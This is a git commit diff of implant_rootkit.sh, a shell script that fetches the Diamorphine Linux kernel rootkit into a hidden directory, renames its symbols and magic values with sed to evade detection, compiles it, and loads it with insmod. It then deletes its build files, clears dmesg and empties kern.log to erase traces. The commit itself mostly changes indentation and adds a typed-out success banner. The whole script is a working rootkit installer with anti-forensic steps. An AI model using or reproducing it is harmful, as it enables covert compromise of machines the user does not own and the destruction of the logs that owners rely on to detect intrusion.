722eef6b5422cbffedf6d8148f2782d4c260f931
MatheuZ Security <88067225+MatheuZSecurity@users.noreply.github.com>
2023-06-02 14:20:31 -0300

    Update implant_rootkit.sh

--- implant_rootkit.sh
+++ implant_rootkit.sh
@@ -9,43 +9,56 @@ command -v insmod >/dev/null 2>&1 || { echo >&2 "[ERROR] insmod command not foun
 command -v gcc >/dev/null 2>&1 || { echo >&2 "[ERROR] gcc command not found. Please install it."; exit 1; }
 
 dir() {
-    mkdir -p  /var/tmp/.cache
+	mkdir -p  /var/tmp/.cache
 }
 
 get_rootkit(){
-    git clone https://github.com/m0nad/Diamorphine /var/tmp/.cache
+	git clone https://github.com/m0nad/Diamorphine /var/tmp/.cache
 }
 
 modify_rk(){
-    mv /var/tmp/.cache/diamorphine.c /var/tmp/.cache/rk.c
-    mv /var/tmp/.cache/diamorphine.h /var/tmp/.cache/rk.h
-    sed -i 's/diamorphine_secret/demonized/g' /var/tmp/.cache/rk.h
-    sed -i 's/diamorphine/demonizedmod/g' /var/tmp/.cache/rk.h
-    sed -i 's/63/57/g' /var/tmp/.cache/rk.h
-    sed -i 's/diamorphine.h/rk.h/g' /var/tmp/.cache/rk.c
-    sed -i 's/diamorphine_init/rk_init/g' /var/tmp/.cache/rk.c
-    sed -i 's/diamorphine_cleanup/rk_cleanup/g' /var/tmp/.cache/rk.c
-    sed -i 's/diamorphine.o/rk.o/g' /var/tmp/.cache/Makefile
+	mv /var/tmp/.cache/diamorphine.c /var/tmp/.cache/rk.c
+	mv /var/tmp/.cache/diamorphine.h /var/tmp/.cache/rk.h
+	sed -i 's/diamorphine_secret/demonized/g' /var/tmp/.cache/rk.h
+	sed -i 's/diamorphine/demonizedmod/g' /var/tmp/.cache/rk.h
+	sed -i 's/63/57/g' /var/tmp/.cache/rk.h
+	sed -i 's/diamorphine.h/rk.h/g' /var/tmp/.cache/rk.c
+	sed -i 's/diamorphine_init/rk_init/g' /var/tmp/.cache/rk.c
+	sed -i 's/diamorphine_cleanup/rk_cleanup/g' /var/tmp/.cache/rk.c
+	sed -i 's/diamorphine.o/rk.o/g' /var/tmp/.cache/Makefile
 }
 
 make_rk(){
-    make -C /var/tmp/.cache/
+	make -C /var/tmp/.cache/
 }
 
 load_rk(){
-    insmod /var/tmp/.cache/rk.ko
+	insmod /var/tmp/.cache/rk.ko
 }
 
 clean_files(){
-    make clean -C /var/tmp/.cache/
-    rm -rf /var/tmp/.cache
+	make clean -C /var/tmp/.cache/
+	rm -rf /var/tmp/.cache
 }
 
 remove_logs(){
-    dmesg -C
-    echo "" > /var/log/kern.log
+	dmesg -C
+	echo "" > /var/log/kern.log
 }
 
 clear
 
 dir && get_rootkit && modify_rk && make_rk && load_rk && clean_files && remove_logs /
+
+clear
+
+scs="[*] Success! Rootkit has been implanted. [*]"
+
+for i in $(seq 1 ${#scs}); do
+        echo -ne "${scs:i-1:1}"
+        sleep 0.08
+done
+
+echo -ne "\n"
+
+clear
